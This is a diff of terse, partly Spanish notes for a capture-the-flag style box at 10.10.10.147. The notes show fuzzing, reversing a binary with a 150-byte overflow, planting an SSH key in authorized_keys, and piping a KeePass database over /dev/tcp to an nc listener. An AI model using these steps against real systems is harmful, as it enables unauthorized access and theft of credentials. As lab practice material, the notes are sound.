@@ -1,26 +1,26 @@
 10.10.10.147
 [
-	wfuzz::: --hc=404 -t200 -z list,html-php http://$(mvnb)/FUZZ.FUZ2Z
+	::: wfuzz --hc=404 -t200 -z list,html-php http://$(mvnb)/FUZZ.FUZ2Z
 			000000043:   200        370 L    948 W      10787 Ch    "index - html"
 
-	firefox::: Ctrl-u
+	::: firefox Ctrl-u
 
 					<!-- 'myapp' can be downloaded to analyze from here
      its running on port 1337 -->
 
 		:: http://$(mvnb)/myapp
 
-	ghidra:::    ./myapp			"apt install ghidra"
+	::: ghidra    ./myapp			"apt install ghidra"
 
 		:: functions ->  main
 			char user_input [112];
 
 		:: python3 -c 'print("A"*150)'
 
-	gdb::: gdb ./myapp					"apt install gdb"
+	:::  gdb ./myapp					"apt install gdb"
 
-		gef:::		https://github.com/hugsy/gef  ->  bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
-		 gdb:: gdb ./myapp
+		::: gef		https://github.com/hugsy/gef  ->  bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+		 :: gdb ./myapp
 
 					GNU gdb (Debian.....)
 					gef>  
@@ -34,7 +34,7 @@
 
 			::: echo 'id_rsa.pub__VPN' > $HOME/.ssh/authorized_keys
 	
-	ssh:::  ssh  user@$(mvnb)				"ya no va a perdir password por authorized_keys...<3 <3 <3"
+	:::  ssh  user@$(mvnb)				"ya no va a perdir password por authorized_keys...<3 <3 <3"
 
 	::: nc -nlvp 1234
 	trgd::: cat < MyPassword.kdbx > /dev/tcp/$(mvnb --vpn)/1234
